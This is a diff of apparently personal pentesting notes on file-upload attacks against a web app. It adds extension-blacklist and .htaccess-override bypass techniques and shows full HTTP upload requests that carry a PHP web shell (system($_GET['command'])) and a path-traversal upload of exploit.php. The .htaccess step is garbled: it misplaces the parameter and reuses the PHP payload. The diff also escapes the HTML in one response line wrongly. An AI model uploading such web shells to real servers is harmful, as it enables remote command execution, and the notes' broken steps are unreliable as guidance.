@@ -129,14 +129,86 @@ Content-Type: text/html; charset=UTF-8
 X-Frame-Options: SAMEORIGIN
 Content-Length: 135
 
-The file avatars/../exploit.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
+The file avatars/../exploit.php has been uploaded.<p>&lt;a href="/my-account" title="Return to previous page"&lt;« Back to My Account&lt;/a&lt;</p>
 
 You see the file was successfully uploaded, so, you need to go one folder back to test if the file is there.
 
-
 <b>:::: EXTENSION BLACKLIST BYPASS</b>
 
+Such blacklists can sometimes be bypassed by using lesser known, alternative file extensions that may still be executable, such as .php5, 
+.shtml, and so on.
 
+>> OVERRIDE SERVER CONFIG
+
+servers typically won't execute files unless they have been configured to do so. before an Apache server will execute PHP files requested by a client, 
+developers might have to edit /etc/apache2/apache2.conf
+
+Many servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the 
+global settings. Apache servers, for example, will load a directory-specific configuration from a file called .htaccess if one is present. similarly, 
+developers can make directory-specific configuration on IIS servers using a web.config file. 
+
+so, you may occasionally find servers that fail to stop you from uploading your own malicious configuration file. In this case, even if the file extension 
+you need is blacklisted, you may be able to trick the server into mapping an arbitrary, custom file extension to an executable MIME type.
+
+_SAMPLE_
+
+REQUEST:	
+	
+POST /my-account/avatar HTTP/1.1
+Referer: https://machetevault.com/my-account
+Accept-Encoding: gzip, deflate, br, zstd
+Accept-Language: en-US,en;q=0.9
+Cookie: session=Amvce1GTzrJM44dIQ4z5yBIb0lnqiGS6
+
+------WebKitFormBoundaryvzIa21H4a0qAp0T0
+Content-Disposition: form-data; name="avatar"; filename="cumbia.php"
+Content-Type: text/php
+
+&lt;?php echo system($_GET['command']); ?&gt;
+------WebKitFormBoundaryvzIa21H4a0qAp0T0
+Content-Disposition: form-data; name="user"
+
+RESPONSE:
+
+HTTP/1.1 403 Forbidden
+Date: Sun, 02 Feb 2025 01:45:46 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Keep-Alive: timeout=5, max=100
+Connection: close
+Content-Type: text/html; charset=UTF-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 164
+
+Sorry, php files are not allowed.
+
+>> EXPLOIT
+
+the response provide information about the web server you are working on, so you can search for config files associated to the webserver you
+found. to attempt to force the app to use a different config file, you need to change a couple of parameters on the content disposition of the 
+request.
+
+> from
+
+------WebKitFormBoundaryvzIa21H4a0qAp0T0
+Content-Disposition: form-data; name="avatar"; filename="cumbia.php"
+Content-Type: text/php
+
+&lt;?php echo system($_GET['command']); ?&gt;
+
+> to
+
+------WebKitFormBoundaryvzIa21H4a0qAp0T0
+Content-Disposition: form-data; name="avatar"; .htaccess="cumbia.php"
+Content-Type: text/plain
+
+&lt;?php echo system($_GET['command']); ?&gt;
+	
+<b>AND</b>
+
+modify the payload itself to force the server to use a new extension file as a valid extension to execute php payloads. 
+
+
+	
 </details>
 </div>
 </pre>
